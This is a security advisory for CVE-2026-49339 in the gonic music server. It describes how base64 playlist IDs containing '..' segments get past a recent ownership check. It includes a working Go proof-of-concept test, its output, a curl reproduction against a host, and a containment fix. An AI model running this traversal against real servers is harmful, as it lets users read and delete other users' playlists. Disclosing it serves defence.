# [H] gonic: Path Traversal in playlist `id` bypasses ownership check, enabling any user to read/delete other users' playlists

## Summary
Severity: High
Advisory: GHSA-2fp4-5v5c-4448
CVE: CVE-2026-49339
CWE: CWE-22, CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-2fp4-5v5c-4448
Type: github-advisory

## Affected
- Go: `go.senan.xyz/gonic` — affected >=0 <0.21.0

## Details
## Summary

The maintainer's recent fix in [`6dd71e6a3c966867ef8c900d359a7df75789f410`](https://github.com/sentriz/gonic/commit/6dd71e6) (`fix(subsonic): enforce playlist ownership on getPlaylist/deletePlaylist`) added an ownership check based on `playlist.UserID`. However, `playlist.UserID` is derived from the *first path segment* of the attacker-controlled playlist ID, with no path containment on the resolved file path.

**Any authenticated Subsonic user** can therefore bypass the ownership check and:

1. **Read any other user's playlist** (name, comment, IsPublic flag, song list) by crafting a base64-encoded playlist ID whose first segment matches their own user ID, followed by `..` traversal segments pointing into another user's playlist directory.
2. **Delete any other user's playlist** (including admin's curated playlists) by the same trick against `deletePlaylist`.
3. **Probe arbitrary file paths on the host** for existence/readability.

This is a bypass of the boundary the 6dd71e6 fix is trying to enforce; it is closely related to the original GONIC-1 IDOR but uses a different primitive (path traversal in the `id` parameter rather than direct cross-user access).

## Root cause

`server/ctrlsubsonic/handlers_playlist.go::playlistIDDecode` performs raw base64 decode of the `id` parameter and passes the byte string straight to `playlistStore.Read/Delete`:

```go
func playlistIDDecode(id specid.ID) string {
    path, _ := base64.URLEncoding.DecodeString(id.StringValue)
    return string(path)
}
```

`playlist/playlist.go::Store.Read` then:

```go
absPath := filepath.Join(s.basePath, relPath)   // no containment check
// ...
playlist.UserID, err = userIDFromPath(relPath)  // extracts firstPathEl, e.g. "2"
if err != nil {
    playlist.UserID = 1                          // fallback
}
```

`userIDFromPath` reads only the first segment via `firstPathEl(relPath)` (`strconv.Atoi` of `strings.Split(path, "/")[0]`). It does not validate that the cleaned absolute path stays under `s.basePath`.

The `id` parameter is base64-decoded as raw bytes (no path cleaning at decode time), so a payload like `"2/../../<victim>/playlist.m3u"` is preserved verbatim. `userIDFromPath` extracts `"2"` (the attacker's own user ID), `playlist.UserID = 2`, and the ownership check `playlist.UserID != user.ID && !playlist.IsPublic` becomes `2 != 2 && ...` → **false** → access allowed. Meanwhile `filepath.Join` resolves the `..` segments and escapes `basePath`.

## Affected code

- `playlist/playlist.go:88-144` — `Store.Read` joins `relPath` with `basePath` without containment validation
- `playlist/playlist.go:200-206` — `Store.Delete` (same pattern)
- `playlist/playlist.go:208-220` — `userIDFromPath` / `firstPathEl` trust only the first path segment
- `server/ctrlsubsonic/handlers_playlist.go:51-72` — `ServeGetPlaylist` ownership check
- `server/ctrlsubsonic/handlers_playlist.go:182-202` — `ServeDeletePlaylist` ownership check
- `server/ctrlsubsonic/handlers_playlist.go:209-212` — `playlistIDDecode` (no validation)

## Live PoC — passing Go test

Drop this into `server/ctrlsubsonic/handlers_playlist_read_traversal_test.go` and run `go test -run TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix ./server/ctrlsubsonic/ -v`:

```go
package ctrlsubsonic

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix(t *testing.T) {
	f := newFixture(t)
	t.Logf("alt user ID: %d, admin user ID: %d", f.alt.ID, f.admin.ID)

	// Plant a sentinel M3U file outside the playlists directory.
	tmpDir := filepath.Dir(f.contr.musicPaths[0].Path)
	sentinelDir := filepath.Join(tmpDir, "sensitive")
	require.NoError(t, os.MkdirAll(sentinelDir, 0o755))
	sentinelPath := filepath.Join(sentinelDir, "secret.m3u")
	require.NoError(t, os.WriteFile(sentinelPath, []byte(`#GONIC-NAME:"victim-secret"
#GONIC-COMMENT:"sensitive content"
#GONIC-IS-PUBLIC:"false"
`), 0o644))

	// RAW string — playlistIDDecode does base64 only, no path cleaning.
	rawRel := fmt.Sprintf("%d/../../sensitive/secret.m3u", f.alt.ID)
	traversalID := playlistIDEncode(rawRel).String()

	// f.alt is the NON-ADMIN user.
	resp := f.query(t, f.contr.ServeGetPlaylist, f.alt, url.Values{"id": {traversalID}})
	t.Logf("resp: %s", string(resp))

	require.Contains(t, string(resp), "victim-secret",
		"VULNERABLE: non-admin user (ID=%d) read playlist outside playlists/", f.alt.ID)
}
```

Test output against current `master` HEAD `6dd71e6`:

```
=== RUN   TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix
    alt user ID: 2, admin user ID: 1
    resp: {"subsonic-response":{"status":"ok","version":"1.15.0","type":"gonic","openSubsonic":true,
        "playlist":{"id":"pl-Mi8uLi8uLi9zZW5zaXRpdmUvc2VjcmV0Lm0zdQ==",
        "name":"victim-secret","comment":"sensitive content","owner":"alt",
        "songCount":0,"created":"...","changed":"...","duration":0}}}
--- PASS: TestGetPlaylistArbitraryRead_NonAdmin_UserIDPrefix (0.06s)
```

The same approach against `ServeDeletePlaylist` (`f.contr.ServeDeletePlaylist`) deletes the targeted file.

## HTTP-level reproduction

```bash
# Attacker user (ID = N) reads target playlist owned by user M.
# Construct the raw rel path: "N/../M/<filename>.m3u"
ATTACKER_ID=2
RAW='2/../1/shared.m3u'

# base64-url-encode (no padding stripping needed since playlistIDDecode tolerates it)
ID="pl-$(printf '%s' "$RAW" | base64 -w0 | tr '/+' '_-')"

curl -s "http://gonic-host/rest/getPlaylist.view?u=attacker&p=pass&c=poc&v=1.16.1&f=json&id=$ID" \
  | python3 -m json.tool
# Response includes name, comment, IsPublic, and song list from the victim's playlist.
```

## Impact

- **Confidentiality**: Any authenticated user can read any other user's playlist content, including the private (`IsPublic=false`) playlists that the recent 6dd71e6 fix specifically tried to protect.
- **Integrity / Availability**: Any authenticated user can delete any other user's playlists, including admin's curated lists. Same bypass technique works against `ServeDeletePlaylist`.
- **Trust boundary**: gonic explicitly supports multi-user deployments. This bug defeats the user-to-user authorization model that the maintainer just patched.
- **Arbitrary file content read** is *constrained* by gonic's M3U parser — only `#GONIC-NAME:` / `#GONIC-COMMENT:` attributes from the target file survive parsing. File-existence probing works against arbitrary paths.

## CVSS

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = **7.1 High**

## Suggested fix

Add path containment in `playlist/playlist.go` for `Store.Read`, `Store.Write`, and `Store.Delete` — reject any `relPath` that escapes `s.basePath` after `filepath.Join`:

```go
func (s *Store) contained(relPath string) (string, error) {
    absPath := filepath.Join(s.basePath, relPath)
    rel, err := filepath.Rel(s.basePath, absPath)
    if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
        return "", fmt.Errorf("path %q escapes playlist directory", relPath)
    }
    return absPath, nil
}

func (s *Store) Read(relPath string) (*Playlist, error) {
    defer lock(&s.mu)()
    if err := sanityCheck(s.basePath); err != nil {
        return nil, err
    }
    absPath, err := s.contained(relPath)
    if err != nil {
        return nil, err
    }
    // ... rest unchanged, using absPath
}
```

Apply in `Write()` (line 153) and `Delete()` (line 206) as well. The ownership check at 6dd71e6 then becomes a defense-in-depth layer on top of the structural containment.

## Credits

Reported by Vishal Shukla ([@shukla304](https://github.com/shukla304) / [@therawdev](https://github.com/therawdev)).

## References
- https://github.com/sentriz/gonic/security/advisories/GHSA-2fp4-5v5c-4448
- https://nvd.nist.gov/vuln/detail/CVE-2026-49339
- https://github.com/sentriz/gonic/commit/0824bed88f6bbc490ba28bf09d28e5dfeb07b445
- https://github.com/sentriz/gonic/commit/6dd71e6
- https://github.com/sentriz/gonic
